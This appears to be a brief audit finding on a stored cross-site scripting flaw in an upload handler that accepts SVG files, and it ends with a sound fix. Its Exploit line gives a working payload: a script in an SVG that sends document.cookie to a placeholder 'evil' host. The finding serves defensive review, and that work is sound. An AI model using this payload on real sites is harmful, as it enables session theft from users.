**Vulnerability:** Stored XSS via SVG upload
**Severity:** High
**Why:** SVGs can embed `<script>`; serving them from the same origin executes on view. `f.filename` is also unsanitized.
**Exploit:** Upload `x.svg` with `<script>fetch('//evil?c='+document.cookie)</script>`.
**Fix:**
Use werkzeug.utils.secure_filename, restrict to raster types, and serve uploads from a separate origin/CDN with Content-Disposition and a strict CSP.
